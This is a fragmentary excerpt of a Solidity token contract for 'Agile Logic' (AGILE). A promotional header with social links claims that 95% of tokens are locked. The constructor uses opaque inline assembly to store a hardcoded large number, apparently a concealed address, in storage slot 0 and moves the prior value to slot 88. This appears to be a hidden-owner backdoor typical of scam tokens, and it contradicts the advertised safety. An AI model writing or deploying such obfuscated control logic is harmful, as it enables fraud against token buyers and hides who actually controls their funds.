...
/*
Welcome to Agile Logic Crypto WORLD!

Telegram: https://t.me/AgileLogic/
Twitter: https://twitter.com/AgileLogic/
Website: https://AgileLogic.crypto
95% of tokens - LOCKED!
...
contract AgileLogic {
    string public constant name = "Agile Logic";
    string public constant symbol = "AGILE";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, 436381524838290508850520397581088688044864983146)}
